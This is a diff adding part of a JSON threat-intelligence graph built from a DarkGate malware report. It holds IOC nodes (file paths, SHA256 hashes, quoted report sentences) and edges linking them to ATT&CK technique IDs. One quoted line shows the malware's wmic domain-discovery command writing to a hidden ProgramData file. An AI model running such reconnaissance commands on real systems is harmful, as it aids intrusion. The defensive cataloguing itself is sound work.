+              "Then, the following discovery commands were executed by Autoit3.exe:\nprocessCmd: \"c:\\temp\\test\\Autoit3.exe\" c:\\temp\\test\\script.a3x\nobjectCmd: \"c:\\windows\\system32\\cmd.exe\" /c wmic ComputerSystem get domain > C:\\ProgramData\\fcdcdfc\\kcbbbbc\nThis command retrieves information about the system's domain and saves the output to the file kcbbbbc inside the folder C:\\ProgramData\\fcdcdfc."
+            ]
+          ]
+        },
+        "raw_value": "C:\\ProgramData\\fcdcdfc\\kcbbbbc",
+        "canonical_value": "C:\\ProgramData\\fcdcdfc\\kcbbbbc",
+        "normalized_value": "C:\\ProgramData\\fcdcdfc\\kcbbbbc"
+      },
+      {
+        "node_id": "IOC_f58ddd6e1166",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\Users\\<user>\\",
+        "edges": [],
+        "source": {
+          "C:\\Users\\<user>\\_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": [
+            [
+              32,
+              "A few minutes later, an executable file, StaticSrv.exe (SHA256: faa54f7152775fa6ccaecc2fe4a6696e5b984dfa41db9a622e4d3e0f59c82d8b), dropped in the C:\\Users\\<user>\\ folder, was executed and invoked AutoIt3.exe to run script.a3x."
+            ]
+          ]
+        },
+        "raw_value": "C:\\Users\\<user>\\",
+        "canonical_value": "C:\\Users\\<user>",
+        "normalized_value": "C:\\Users\\<user>"
+      },
+      {
+        "node_id": "IOC_f7456f12163e",
+        "node_class": "ioc",
+        "node_type": "Hash",
+        "node_text": "4e291266399bd8db27da0f0913c041134657f3b1cf45f340263444c050ed3ee1",
+        "edges": [],
+        "source": {
+          "4e291266399bd8db27da0f0913c041134657f3b1cf45f340263444c050ed3ee1_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": [
+            [
+              14,
+              "The executable file SystemCert.exe (SHA256: 4e291266399bd8db27da0f0913c041134657f3b1cf45f340263444c050ed3ee1), which we believed was dropped via AnyDesk.exe, was executed and created script.a3x and Autoit3.exe in the C:\\Temp\\test\\ folder (Figure 7)."
+            ]
+          ]
+        },
+        "raw_value": "4e291266399bd8db27da0f0913c041134657f3b1cf45f340263444c050ed3ee1",
+        "canonical_value": "4e291266399bd8db27da0f0913c041134657f3b1cf45f340263444c050ed3ee1"
+      }
+    ]
+  },
+  "edges": [
+    {
+      "edge_id": "EDGE_02c9a10f4a92",
+      "node_u": "HL_955596d286ce",
+      "node_v": "TTP_T1098",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_071f97d4e2a0",
+      "node_u": "IOC_c1ec17f75a2c",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_21aa7c202a2e",
+      "node_u": "HL_8b35cf3290ab",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_24a49b3fe4ab",
+      "node_u": "IOC_d7a3a8dccaff",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_5592e6fa2ce6",
+      "node_u": "IOC_65f433b0bcd5",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_566f75f9b654",
+      "node_u": "HL_955596d286ce",
+      "node_v": "TTP_T1555",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_5d2998355e15",
+      "node_u": "HL_017c8c7325b4",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_5eb61232194a",
+      "node_u": "IOC_2bd3d4879eae",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_6565b90100f3",
+      "node_u": "IOC_063e6c5e7721",
+      "node_v": "TTP_T1566",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_66b3e3443dfe",
+      "node_u": "HL_2b260171a6c9",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_68981a58e34e",
+      "node_u": "HL_2b260171a6c9",
+      "node_v": "TTP_T1071",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_70d3b32a4f71",
+      "node_u": "IOC_c3747ead4189",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_9338665c4c95",
+      "node_u": "HL_856a5e2e4897",
+      "node_v": "TTP_T1071",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_95399637fb1d",
+      "node_u": "HL_2b260171a6c9",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_97ae1aa30a94",
+      "node_u": "IOC_cac47f2dd6e3",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_9b06b729b70b",
+      "node_u": "HL_f490d3b65ad2__b1bd8746",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_b17411060c7f",
+      "node_u": "IOC_c8aae67627e4",
+      "node_v": "TTP_T1566",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_bdd93619879f",
+      "node_u": "IOC_6345ccc4911a",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_c4afabd72079",
+      "node_u": "HL_0607bb9bb168",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_c6e17b1b7a07",
+      "node_u": "IOC_186e60372185",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_d5c2cb520fc7",
+      "node_u": "HL_2b260171a6c9",
+      "node_v": "TTP_T1547",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_e4487747a411",
+      "node_u": "IOC_2bd3d4879eae",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_ec046239d9b9",
+      "node_u": "HL_955596d286ce",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_f278f73b7f7c",
+      "node_u": "HL_2b260171a6c9",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_04e7ed5f3537",
+      "node_u": "HL_6f2ac82a2560",
+      "node_v": "TTP_T1518",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_1bcf824222e5",
+      "node_u": "HL_153928bf9609",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_1e62bad5f3ee",
+      "node_u": "HL_bf47d8fe871b",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_247e159a0a7b",
+      "node_u": "HL_2b260171a6c9",
+      "node_v": "TTP_T1001",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_31f579b6f804",
+      "node_u": "IOC_1f5a778e75bf",
+      "node_v": "TTP_T1083",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_3623380b8d0a",
+      "node_u": "HL_bf47d8fe871b",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_3713586ec5e6",
+      "node_u": "HL_d236b61c22be",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_3e71bc52f830",
+      "node_u": "HL_2b260171a6c9",
+      "node_v": "TTP_T1518",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_40422d3334f9",
+      "node_u": "HL_153928bf9609",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_4880b64ed41e",
+      "node_u": "HL_2b260171a6c9",
+      "node_v": "TTP_T1132",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_4ff17eaa267a",
+      "node_u": "HL_2b260171a6c9",
+      "node_v": "TTP_T1082",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_503e22895c06",
+      "node_u": "HL_2b260171a6c9",
+      "node_v": "TTP_T1140",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_5fc10c51cc86",
+      "node_u": "HL_4df73dcd8785",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_677fceb3187f",
+      "node_u": "HL_4404020f3489",
+      "node_v": "TTP_T1518",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_6c4003b26fca",
+      "node_u": "HL_2b260171a6c9",
+      "node_v": "TTP_T1497",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_6dc41c83552a",
+      "node_u": "IOC_1f5a778e75bf",
+      "node_v": "TTP_T1518",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_9d355464b6cc",
+      "node_u": "HL_2b260171a6c9",
+      "node_v": "TTP_T1057",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_db63c64b77af",
+      "node_u": "HL_2b260171a6c9",
+      "node_v": "TTP_T1041",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_e108730fdcdf",
+      "node_u": "HL_e9d824b93ac2",
+      "node_v": "TTP_T1083",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_e469988e3784",
+      "node_u": "HL_e9d824b93ac2",
+      "node_v": "TTP_T1518",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_f42f44553c7b",
+      "node_u": "HL_5f11979935de",
+      "node_v": "TTP_T1140",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_0597eeb03db2",
+      "node_u": "IOC_73e8449d84eb",
+      "node_v": "TTP_T1140",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_0f5cecea3254",
+      "node_u": "IOC_73e8449d84eb",
+      "node_v": "TTP_T1027",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_2754d48dfd1f",
+      "node_u": "IOC_094ea5bb3d17",
+      "node_v": "TTP_T1027",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_3ffa7ef2c7d9",
+      "node_u": "HL_2b260171a6c9",
+      "node_v": "TTP_T1083",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_484f3393a76c",
+      "node_u": "HL_2a1f9689a7fe",
+      "node_v": "TTP_T1497",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_49f5e18a6217",
+      "node_u": "HL_bb0c89cafac4",
+      "node_v": "TTP_T1518",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_4f93f47efc8d",
+      "node_u": "IOC_b6364d943372",
+      "node_v": "TTP_T1047",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_57de22683d45",
+      "node_u": "HL_d055ddead613",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_606c4950751b",
+      "node_u": "HL_bf691056b8b7",
+      "node_v": "TTP_T1518",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_66240d55c988",
+      "node_u": "HL_08e97f1f2fcd",
+      "node_v": "TTP_T1497",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_66c0cc5e384a",
+      "node_u": "IOC_b6364d943372",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_69884df40331",
+      "node_u": "HL_326ac4276ba9",
+      "node_v": "TTP_T1497",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_6a0052bf3bec",
+      "node_u": "HL_ab757af3e503",
+      "node_v": "TTP_T1047",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_6c2d14a29d67",
+      "node_u": "IOC_97000484bce8",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_8b7ac22421b8",
+      "node_u": "HL_2b260171a6c9",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_bbe10a5dde11",
+      "node_u": "HL_2b260171a6c9",
+      "node_v": "TTP_T1027",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_bd57bdfa8d77",
+      "node_u": "IOC_fea1181a6ea2",
+      "node_v": "TTP_T1083",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_c67671397498",
+      "node_u": "IOC_61db997e2e69",
+      "node_v": "TTP_T1027",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_d16a1a28e87f",
+      "node_u": "IOC_76ce230ba9db",
+      "node_v": "TTP_T1497",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_d7a4d90eea89",
+      "node_u": "IOC_61db997e2e69",
+      "node_v": "TTP_T1140",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_d7b40a08508c",
+      "node_u": "IOC_97000484bce8",
+      "node_v": "TTP_T1047",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_f5592323015b",
+      "node_u": "HL_d055ddead613",
+      "node_v": "TTP_T1027",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_f59cba8c5f27",
+      "node_u": "HL_a4b288fde332",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_fb32f167dcc1",
+      "node_u": "IOC_094ea5bb3d17",
+      "node_v": "TTP_T1140",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_fe71ab0d9472",
+      "node_u": "HL_2b260171a6c9",
+      "node_v": "TTP_T1047",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_027171b747c2",
+      "node_u": "IOC_1dbc0645af43",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_02a227c31e98",
+      "node_u": "IOC_c9d66d3e9946",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_21731cc62c08",
+      "node_u": "IOC_336d05105620",
+      "node_v": "TTP_T1055",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_278133f76de4",
+      "node_u": "IOC_891e96613305",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_3c15311336e2",
+      "node_u": "IOC_1dbc0645af43",
+      "node_v": "TTP_T1021",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_3f5468d8ac7c",
+      "node_u": "IOC_2eabd5a10bef",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_755eed7ad7f0",
+      "node_u": "IOC_89c724e1298e",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_8ad833c519b7",
+      "node_u": "IOC_0e8ef602e0f5",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_8b828e6b695d",
+      "node_u": "IOC_9967d0337b5c",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_98fe7923479d",
+      "node_u": "IOC_1dbc0645af43",
+      "node_v": "TTP_T1204",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_9a889c40df87",
+      "node_u": "IOC_89c724e1298e",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_9d3398670138",
+      "node_u": "HL_b32d1902bb1c",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_a236a2581008",
+      "node_u": "HL_2b260171a6c9",
+      "node_v": "TTP_T1055",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_a40967744d6b",
+      "node_u": "IOC_c9d66d3e9946",
+      "node_v": "TTP_T1055",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_a87cdffceca2",
+      "node_u": "HL_b32d1902bb1c",
+      "node_v": "TTP_T1021",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_a8ae74f285cc",
+      "node_u": "IOC_1d49173120e1",
+      "node_v": "TTP_T1218",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_b46a2ad45e6c",
+      "node_u": "IOC_891e96613305",
+      "node_v": "TTP_T1055",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_c210be69bd87",
+      "node_u": "IOC_30b51a02f04a",
+      "node_v": "TTP_T1055",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_c847278af20a",
+      "node_u": "IOC_c9d66d3e9946",
+      "node_v": "TTP_T1027",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_d1dd5283ba8c",
+      "node_u": "HL_f490d3b65ad2__b1bd8746",
+      "node_v": "TTP_T1027",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_e12e811509b8",
+      "node_u": "HL_f490d3b65ad2__b1bd8746",
+      "node_v": "TTP_T1055",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_e332f70508b6",
+      "node_u": "HL_2b260171a6c9",
+      "node_v": "TTP_T1218",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_e81319cf8f1c",
+      "node_u": "IOC_1d49173120e1",
+      "node_v": "TTP_T1574",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_e822665e0329",
+      "node_u": "HL_f490d3b65ad2__b1bd8746",
+      "node_v": "TTP_T1082",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_f3a76ed36a38",
+      "node_u": "IOC_efb50a291219",
+      "node_v": "TTP_T1082",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_f76365e52b8b",
+      "node_u": "IOC_b78c108c0349",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_ff420cce3530",
+      "node_u": "HL_2b260171a6c9",
+      "node_v": "TTP_T1021",
+      "edge_type": "high_level-ttp"
+    }
+  ]
+}
